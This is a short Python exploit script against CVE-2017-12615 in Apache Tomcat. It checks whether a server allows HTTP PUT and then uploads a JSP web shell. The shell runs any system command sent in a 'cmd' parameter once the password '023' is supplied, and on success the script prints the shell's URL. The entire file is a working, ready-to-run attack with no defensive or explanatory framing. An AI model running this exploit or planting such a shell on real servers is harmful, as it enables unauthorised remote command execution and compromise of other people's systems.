import http.client
import sys
import time
body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''

def run(url,port):
    try:
        url=str(url)+':'+str(port)
        vurl=url
        conn = http.client.HTTPConnection(url)
        conn.request(method='OPTIONS', url='/ffffzz')
        headers = dict(conn.getresponse().getheaders())
        if ('Allow' in headers and \
       headers['Allow'].find('PUT') > 0) or ('allow' in headers and \
       headers['allow'].find('PUT') > 0) :
            conn.close()
            conn = http.client.HTTPConnection(url)
            url = "/" + str(int(time.time()))+'.jsp/'
            conn.request( method='PUT', url= url, body=body)
            res = conn.getresponse()
            if res.status  == 201 :
                return (1,'[+] [{}] is Vulnerable about cve_2017_12615! shell: {}'.format(vurl,vurl+url[:-1]))
            elif res.status == 204 :
                return (1,'[+] %s cve_2017_12615 file exists!'%vurl)
            else:
                return (0,'[-] %s seems no vuln about cve_2017_12615'%vurl)
            conn.close()
        else:
            return (0,"[-] %s seems no vuln about cve_2017_12615"%vurl)
    except Exception:
        return (0,"[-] %s seems no vuln about cve_2017_12615!!"%vurl)

if __name__=="__main__":
    url = sys.argv[1]
    port = int(sys.argv[2])
    run(url,port)